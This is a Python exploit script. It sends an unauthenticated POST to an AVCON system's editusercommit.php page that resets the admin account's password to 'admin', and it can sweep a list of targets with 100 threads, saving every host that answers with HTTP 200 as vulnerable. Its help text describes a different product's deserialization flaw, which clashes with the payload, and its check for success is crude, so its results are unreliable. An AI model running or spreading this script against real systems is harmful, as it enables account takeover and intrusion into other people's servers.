import requests
import argparse
import sys
import logging
from multiprocessing.dummy import Pool
import re

requests.packages.urllib3.disable_warnings()  # 解除警告

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|





                            version:1.1.0
                            author:fangwei   
    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="致远OAM3Server存在反序列化漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            url_list = [url.strip() for url in f.readlines()]
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/avcon/av_user/editusercommit.php?currentpage=1"
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip,deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "226",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=4",
    }
    data = ('userid=admin&username=administration&password=admin&rpassword=admin&question=admin&answer=123&gender=%E7'
            '%94%B7&birthday=0000-00-00&edutypeid=0&phone=&mobile=&email=&address=&postcode=&go=-2&confirm=+++%E7%A1'
            '%AE%E5%AE%9A+++')
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        res1 = requests.post(url= target + payload, data=data, headers=headers, verify=False, timeout=5)
        if res1.status_code == 200:
            logger.info(f"[+] {target} 存在漏洞")
            with open("AVCONre.txt","a",encoding='utf-8') as f:
                f.write(target + "\n")
        else:
            logger.info(f"[-] {target} 不存在漏洞")
    except Exception as e:
        logger.error(f"[-] {target} 连接失败")


if __name__ == '__main__':
    main()